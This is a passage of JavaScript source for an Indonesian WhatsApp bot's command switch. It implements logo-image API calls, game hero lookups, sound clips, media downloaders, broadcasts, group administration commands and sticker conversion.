if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} DEFFBOTz`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://ziy.herokuapp.com/api/lolimaker?nama=${query}&apikey=xZiyy`)
Aikko.sendMessage(from, bf, image, { quoted: ftrol, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'logosadboy':
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Deffri|Gans`)
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://ziy.herokuapp.com/api/sadboy?text1=${m1}&text2=${m2}&apikey=xZiyy`)
Aikko.sendMessage(from, bf, image, { quoted: ftrol, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'logorem':
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} DEFFBOTz`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://ziy.herokuapp.com/api/rem?nama=${query}&apikey=xZiyy`)
Aikko.sendMessage(from, bf, image, { quoted: ftrol, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'logogura':
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} DEFFBOTz`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://ziy.herokuapp.com/api/Gura?nama=${query}&apikey=xZiyy`)
Aikko.sendMessage(from, bf, image, { quoted: ftrol, caption: 'Nah Kak Jangan Lupa Support DEFFBOTz yah Kak????' })
break
case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*
*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'script':
case 'sc':
gambar = fs.readFileSync('./image/logo.jpg')
menunya = 
`SUBSCRIBE DEFFBOTz ye
Link:https://github.com/deffrirs/NewBot`

teks =
`*??? ${botname} ???*`
but = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: '??????????? ????' }, type: 1 }
        ]
        sendButLocation(from, menunya, teks, gambar, but)
break

//??????????????????????????????[GAME MENU]????????????????????????????????????????????????????????????????????????????????????//
case 'sound1':
satu = fs.readFileSync('./lib/sound1.mp3');
Aikko.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./lib/sound2.mp3');
Aikko.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./lib/sound3.mp3');
Aikko.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./lib/sound4.mp3');
Aikko.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./lib/sound5.mp3');
Aikko.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./lib/sound6.mp3');
Aikko.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./lib/sound7.mp3');
Aikko.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break									
case 'sound8':
delapan = fs.readFileSync('./lib/sound8.mp3');
Aikko.sendMessage(from, delapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./lib/sound9.mp3');
Aikko.sendMessage(from, sembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./lib/sound10.mp3');
Aikko.sendMessage(from, sepuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound11':
sebelas = fs.readFileSync('./lib/sound11.mp3');
Aikko.sendMessage(from, sebelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound12':
duabelas = fs.readFileSync('./lib/sound12.mp3');
Aikko.sendMessage(from, duabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound13':
tigabelas = fs.readFileSync('./lib/sound13.mp3');
Aikko.sendMessage(from, tigabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound14':
empatbelas = fs.readFileSync('./lib/sound14.mp3');
Aikko.sendMessage(from, empatbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound15':
limabelas = fs.readFileSync('./lib/sound15.mp3');
Aikko.sendMessage(from, limabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound16':
enambelas = fs.readFileSync('./lib/sound16.mp3');
Aikko.sendMessage(from, enambelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound17':
tujuhbelas = fs.readFileSync('./lib/sound17.mp3');
Aikko.sendMessage(from, tujuhbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound118':
delapanbelas = fs.readFileSync('./lib/sound18.mp3');
Aikko.sendMessage(from, delapanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound19':
sembilanbelas = fs.readFileSync('./lib/sound19.mp3');
Aikko.sendMessage(from, sembilanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound20':
duapuluh = fs.readFileSync('./lib/sound20.mp3');
Aikko.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound21':
duasatu = fs.readFileSync('./lib/sound21.mp3');
Aikko.sendMessage(from, duasatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound22':
duadua = fs.readFileSync('./lib/sound22.mp3');
Aikko.sendMessage(from, duadua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound23':
duatiga = fs.readFileSync('./lib/sound23.mp3');
Aikko.sendMessage(from, duatiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound24':
duaempat = fs.readFileSync('./lib/sound24.mp3');
Aikko.sendMessage(from, duaempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound25':
dualima = fs.readFileSync('./lib/sound25.mp3');
Aikko.sendMessage(from, dualima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound26':
duaenam = fs.readFileSync('./lib/sound26.mp3');
Aikko.sendMessage(from, duaenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound27':
duatujuh = fs.readFileSync('./lib/sound27.mp3');
Aikko.sendMessage(from, duatujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound28':
duadelapan = fs.readFileSync('./lib/sound28.mp3');
Aikko.sendMessage(from, duadelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound29':
duasembilan = fs.readFileSync('./lib/sound29.mp3');
Aikko.sendMessage(from, duasembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound30':
tigapuluh = fs.readFileSync('./lib/sound30.mp3');
Aikko.sendMessage(from, tigapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound31':
tigasatu = fs.readFileSync('./lib/sound31.mp3');
Aikko.sendMessage(from, tigasatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound32':
tigadua = fs.readFileSync('./lib/sound32.mp3');
Aikko.sendMessage(from, tigadua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound33':
tigatiga = fs.readFileSync('./lib/sound33.mp3');
Aikko.sendMessage(from, tigatiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound34':
tigaempat = fs.readFileSync('./lib/sound34.mp3');
Aikko.sendMessage(from, tigaempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./lib/sound35.mp3');
Aikko.sendMessage(from, tigalima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./lib/sound35.mp3');
Aikko.sendMessage(from, tigalima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound36':
tigaenam = fs.readFileSync('./lib/sound36.mp3');
Aikko.sendMessage(from, tigaenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound37':
tigatujuh = fs.readFileSync('./lib/sound37.mp3');
Aikko.sendMessage(from, tigatujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound38':
tigadelapan = fs.readFileSync('./lib/sound38.mp3');
Aikko.sendMessage(from, tigadelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound39':
tigasembilan = fs.readFileSync('./lib/sound39.mp3');
Aikko.sendMessage(from, tigasembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound40':
empatpuluh = fs.readFileSync('./lib/sound40.mp3');
Aikko.sendMessage(from, empatpuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound41':
empatsatu = fs.readFileSync('./lib/sound41.mp3');
Aikko.sendMessage(from, empatsatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound42':
empatdua = fs.readFileSync('./lib/sound42.mp3');
Aikko.sendMessage(from, empatdua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound43':
empattiga = fs.readFileSync('./lib/sound43.mp3');
Aikko.sendMessage(from, empattiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound44':
empatempat = fs.readFileSync('./lib/sound44.mp3');
Aikko.sendMessage(from, empatempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound45':
empatlima = fs.readFileSync('./lib/sound45.mp3');
Aikko.sendMessage(from, empatlima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound46':
empatenam = fs.readFileSync('./lib/sound46.mp3');
Aikko.sendMessage(from, empatenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound47':
empattujuh = fs.readFileSync('./lib/sound47.mp3');
Aikko.sendMessage(from, empattujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound48':
empatdelapan = fs.readFileSync('./lib/sound48.mp3');
Aikko.sendMessage(from, empatdelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound49':
empatsembilan = fs.readFileSync('./lib/sound49.mp3');
Aikko.sendMessage(from, empatsembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound50':
limapuluh = fs.readFileSync('./lib/sound50.mp3');
Aikko.sendMessage(from, limapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
//??????????????????????????????[ owner ]??????????????????????????????//
case 'owner':
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
Aikko.sendMessage(from, {displayName: `Ownernya ${botname}`, vcard: vcard2}, contact, 
{ quoted: ftrol, 
})
reply(`_Tuh Kak Ownerku_`)
break
case 'join':
              if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return reply('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return reply('pastikan link sudah benar!')
            var response = await Aikko.acceptInvite(codeInvite)
            reply('SUKSES')
            } catch {
            reply('LINK ERROR!')
            }
        break
case 'wa.me':
case 'wame':
Aikko.updatePresence(from, Presence.composing) 
options = {
text: `??? *SELF WHATSAPP* ???\n\n_Request by_ : *@${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
contextInfo: { mentionedJid: [sender] }
}
Aikko.sendMessage(from, options, text, { quoted: mek } )
break
case 'bc':
             if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu100 = await Aikko.chats.all()
             if (isMedia && !Aikko.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Aikko).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Aikko
             bc100 = await Aikko.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             Aikko.sendMessage(_.jid, bc100, image, {quoted: ftrol, caption: `*??? SIARAN DEFFBOTz ???*\n\n${body.slice(4)}`})
}
             fakeyt('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             Aikko.sendMessage(_.jid, 
			{"contentText": `*??? PESAN SIARAN BOT ???*\n\n${body.slice(4)}`,
			"footerText": `${tanggal}`,
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "???????????"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break

//??????????????????????????????[ Fitur Download ]??????????????????????????????//

case 'play':
if (args.length ==0)return reply('Judul Lagunya Apa?')
bo = args.join(" ")
reply(mess.wait)
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp3?query=${q}&apikey=Alphabot`)
thmb = await getBuffer(ini.results.thumb)
ply1 =`Judul: ${ini.results.title}\nSize: ${ini.results.size}\nChannel: ${ini.results.channel}`
ply2 =`Silahkan Pilih Media Di Bawah ini`
but = [
{ buttonId: `${prefix}ytmp3 ${args.join(" ")}`, buttonText: { displayText: '?????????s????? ????' }, type: 1 },
{ buttonId: `${prefix}ytmp4 ${args.join(" ")}`, buttonText: { displayText: '?????????????? ???????' }, type: 1 }
]
sendButLocation(from, ply1, ply2, thmb, but)
break
case 'ytmp3':
if (args.length ==0)return reply('Link Nya Mana Banh?')
reply(mess.wait)
bo = args.join(" ")
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp3?query=${q}&apikey=Alphabot`)
thmb = await getBuffer(ini.results.thumb)
ply1 =`Judul: ${ini.results.title}\nSize: ${ini.results.size}\nChannel: ${ini.results.channel}`
ply2 =`Silahkan Pilih Media Di Bawah ini`
mp3 = await getBuffer(ini.results.result)
Aikko.sendMessage(from, mp3, audio, {quoted: mek})
break
case 'ytmp4':
if (args.length ==0)return reply('Link nya Mana banh?')
reply(mess.wait)
bo = args.join(" ")
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp4?query=${q}&apikey=Alphabot`)
thmb = await getBuffer(ini.results.thumb)
ply1 =`Judul: ${ini.results.title}\nSize: ${ini.results.size}\nChannel: ${ini.results.channel}`
ply2 =`Silahkan Pilih Media Di Bawah ini`
mp4 = await getBuffer(ini.results.result)
Aikko.sendMessage(from, mp4, video)
break
case 'tiktoknowm':

anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/tiktok?url=${q}&apikey=NisaaCantik`)

tiktok = await getBuffer(anu.result.nowatermark)

Aikko.sendMessage(from, tiktok, video, {quoted: mek, caption : 'Done bro'})

break

case 'tiktokwm':

anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/tiktok?url=${q}&apikey=NisaaCantik`)

tiktok = await getBuffer(anu.result.watermark)

Aikko.sendMessage(from, tiktok, video, {quoted: mek, caption : 'Done bro'})

break

case 'tiktokaudio':

anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/tiktok?url=${q}&apikey=NisaaCantik`)

tiktok = await getBuffer(anu.result.audio)

Aikko.sendMessage(from, tiktok, audio, {quoted: mek})

break
//??????????????????????????????[ Fitur Grup ]??????????????????????????????//

case 'welcome':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome on untuk mengaktifkan\n${prefix}welcome off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isWelkom) return reply('*welcome sudah aktif !!*')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ???, Mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isWelkom) return reply('*welcome sudah off sebelumnya !!*')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ???, Menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('*on untuk mengaktifkan, off untuk menonaktifkan*')
}
break
case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiLink) return reply(`Udah aktif`)
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ???, Mengaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antilink.indexOf(from)
_antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ???, Menonaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
break
case 'antivirtex':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiVirtex) return reply(`Udah aktif`)
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ???, Mengaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antivirtex.indexOf(from)
_antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ???, Menonaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
break
case 'report':
case 'lapor':
					const laporan = body.slice(7)
					if (args.length > 300) return Aikko.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					stod = `${sender}`
					const lapor = `*[LAPORAN EROR]*\nNomor : @${stod.split('@')[0]}\nPesan : ${laporan}`
							var options = {
							text: lapor,
                         				contextInfo: {mentionedJid: [stod]},
                     			}
					Aikko.sendMessage(`${owner}@s.whatsapp.net`, options, text, {quoted: mek})
					reply('Laporan anda sudah mendarat ke owner, Laporan palsu atau main?? tidak akan ditanggapi.')
					break
case 'group':
case 'grup':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args[0] === 'buka') {
reply(`*Berhasil Membuka Grup ${groupMetadata.subject}*`)
Aikko.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
reply(`*Berhasil Memtutup Grup ${groupMetadata.subject}*`)
Aikko.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
case 'linkgroup':
case 'linkgrup':
case 'linkgc':
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await Aikko.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Aikko.sendMessage(from, yeh, text, { quoted: ftrol })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Aikko.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
Aikko.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Aikko.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Aikko.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Aikko.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case "kick":
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (
mek.message.extendedTextMessage === undefined ||
mek.message.extendedTextMessage === null
)
return reply("Tag target yang ingin di kick!");
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) {
Aikko.groupRemove(from, mentioned);
reply(mess.success);
} else if (mentioned.length < 1) {
anu = mek.message.extendedTextMessage.contextInfo.participant;
Aikko.groupRemove(from, [anu]);
reply(mess.success);
} else {
Aikko.groupRemove(from, mentioned);
reply(mess.success);
}
break;
case 'tagall':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `??? @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Aikko.groupUpdateSubject(from, `${body.slice(9)}`)
Aikko.sendMessage(from, `\`\`\`Sukses ???, Mengganti nama grup menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Aikko.groupUpdateDescription(from, `${body.slice(9)}`)
Aikko.sendMessage(from, `\`\`\`Sukses ???, Mengganti deskripsi grup\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setppgrup':
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await Aikko.downloadMediaMessage(encmedia)
Aikko.updateProfilePicture(from, media)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
try {
quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
hideTag(from, `${quotedText}`)
} catch {
hideTag(from, `${q}`)
}
break
case 'infogc':
case 'infogrup':
case 'infogrouup':
case 'grupinfo':
case 'groupinfo':
if (!isGroup) return reply(mess.only.group)
try {
var pic = await Aikko.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n\n${groupMetadata.desc}`
Aikko.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
json = ['action', 'inviteReset', from]
Aikko.query({json, expect200: true})
reply('Sukses Mereset Link Group')
break
case 'online':
case 'listonline':
case 'here':          
if (!isGroup) return reply(mess.only.group)
try {
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Aikko.chats.get(ido).presences), Aikko.user.jid]
Aikko.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: fkon, contextInfo: { mentionedJid: online }})
} catch (e) {
reply(`${e}`)
}
break
//??????????????????????????????[ Fitur Sticker ]??????????????????????????????//

case 'gifstiker':
case 's':
case 'stickergif':  
case 'sticker':
case 'stiker':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Aikko.downloadAndSaveMediaMessage(encmedia)
ran = '666.webp'
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('error')
})
.on('end', function () {
console.log('Finish')
Aikko.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
